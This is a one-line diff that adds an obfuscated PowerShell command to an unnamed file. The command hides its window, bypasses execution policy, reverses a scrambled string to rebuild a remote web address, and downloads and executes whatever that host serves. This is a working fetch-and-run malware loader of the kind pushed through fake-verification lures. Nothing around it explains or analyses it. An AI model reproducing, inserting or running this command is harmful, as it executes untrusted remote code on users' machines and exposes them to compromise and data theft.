@@ -1,0 +1,1 @@
+powershell -w h -ep b -nop -c "$r='qgnkb/gro.arutpaccresgnkbamq//:sptth';$u=-join$r[($r.Length-1)..0];iex(iwr $u -UseBasicParsing).Content"
